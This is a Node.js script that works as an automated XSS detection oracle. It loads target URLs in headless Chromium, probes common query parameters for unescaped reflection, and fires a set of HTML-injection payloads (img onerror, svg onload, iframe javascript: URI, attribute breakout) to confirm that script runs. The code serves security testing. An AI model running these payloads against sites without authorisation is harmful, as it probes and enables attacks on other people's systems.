// XSS rendering oracle (option B). Renders a target URL in headless Chromium and
// deterministically detects client-side/DOM XSS execution, independent of the LLM.
//
// Usage:  node xss_oracle.mjs "<url>"
//   - If the url contains the marker FUZZ, the payload is injected exactly there
//     (e.g. http://host/#/search?q=FUZZ) and payloads are fired directly.
//   - If the url has NO FUZZ marker (e.g. a bare SPA route http://host/#/search),
//     the oracle sweeps a wordlist of common query parameters: it first does ONE
//     combined reflection probe to find which parameter(s) are echoed unescaped
//     into the DOM, then fires the payloads only on those (cheap + general).
//
// Output: one JSON object on stdout:
//   { target, confirmed, hit:{name,tag,param,url}|null, results:[...] }
//
// Nothing here is target-specific: canonical non-<script> payloads (which fire via
// innerHTML) over a generic parameter wordlist.

import pkg from '/usr/lib/node_modules/playwright/index.js';
const { chromium } = pkg;

const target = process.argv[2];
if (!target) {
  console.log(JSON.stringify({ error: 'missing url argument' }));
  process.exit(0);
}

// Each payload carries a unique tag and calls the exposed __hit() on execution.
// <script> is intentionally EXCLUDED: it does not run when inserted via innerHTML,
// which is exactly the sink these payloads target.
const PAYLOADS = [
  { name: 'img-onerror',   p: `<img src=x onerror="window.__hit('img-onerror')">` },
  { name: 'svg-onload',    p: `<svg onload="window.__hit('svg-onload')"></svg>` },
  { name: 'iframe-jsuri',  p: `<iframe src="javascript:parent.__hit('iframe-jsuri')"></iframe>` },
  { name: 'attr-breakout', p: `"><img src=x onerror="window.__hit('attr-breakout')">` },
  { name: 'alert',         p: `<img src=x onerror="alert('xss-oracle')">` },
];

// Query parameters commonly read and reflected by SPA routes / reflecting handlers.
// Generic, not target-specific.
const PARAM_WORDLIST = [
  'q', 'query', 'search', 'searchValue', 'term', 'keyword', 's',
  'id', 'name', 'title', 'category', 'msg', 'message', 'error', 'lang',
];

// appendParam adds param=value to a url, after the hash fragment when present
// (SPA routes carry their query inside the fragment: /#/search?q=...).
function appendParam(tpl, param, value) {
  const sep = tpl.includes('?') ? '&' : '?';
  return tpl + sep + param + '=' + value;
}

async function render(browser, url, waitMs) {
  const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
  const page = await ctx.newPage();
  let fired = null, dialog = null;
  try { await page.exposeFunction('__hit', (tag) => { if (!fired) fired = tag; }); } catch {}
  page.on('dialog', async (d) => { dialog = d.message(); try { await d.dismiss(); } catch {} });
  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 20000 });
    await page.waitForTimeout(waitMs);
  } catch { /* best-effort: ignore nav timeouts */ }
  let html = '';
  try { html = await page.evaluate(() => (document.body ? document.body.innerHTML : '')); } catch {}
  await ctx.close();
  return { fired, dialog, html };
}

const results = [];
let hit = null;

// injectionPoints: list of { param, build(payload) }. With FUZZ we know the exact
// spot; without it we discover reflecting params with one combined probe.
let injectionPoints = [];

const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
try {
  if (target.includes('FUZZ')) {
    injectionPoints = [{ param: '(fuzz)', build: (pl) => target.split('FUZZ').join(encodeURIComponent(pl)) }];
  } else {
    // Combined reflection probe: one render with a unique marker per candidate
    // param; whichever markers appear raw in the DOM identify the reflecting params.
    const marks = {};
    PARAM_WORDLIST.forEach((p, i) => { marks[p] = `XOPROBE${i}ZZ`; });
    let probeUrl = target;
    for (const p of PARAM_WORDLIST) probeUrl = appendParam(probeUrl, p, encodeURIComponent(marks[p]));
    const probe = await render(browser, probeUrl, 1800);
    const reflecting = PARAM_WORDLIST.filter((p) => probe.html.includes(marks[p]));
    // Fire payloads on reflecting params (cap 3). If none reflected, nothing to do.
    for (const p of reflecting.slice(0, 3)) {
      injectionPoints.push({ param: p, build: (pl) => appendParam(target, p, encodeURIComponent(pl)) });
    }
  }

  for (const ip of injectionPoints) {
    for (const { name, p } of PAYLOADS) {
      const url = ip.build(p);
      const r = await render(browser, url, 2500);
      const didFire = r.fired !== null || r.dialog !== null;
      const tag = r.fired || (r.dialog ? 'alert:' + r.dialog : null);
      const reflectedUnescaped = !!r.html && r.html.includes(name);
      results.push({ name, param: ip.param, fired: didFire, tag, dialog: r.dialog, reflectedUnescaped, url });
      if (didFire && !hit) { hit = { name, tag, param: ip.param, url }; break; }
    }
    if (hit) break; // one confirmed execution is enough
  }
} finally {
  await browser.close();
}

console.log(JSON.stringify({ target, confirmed: hit !== null, hit, results }));
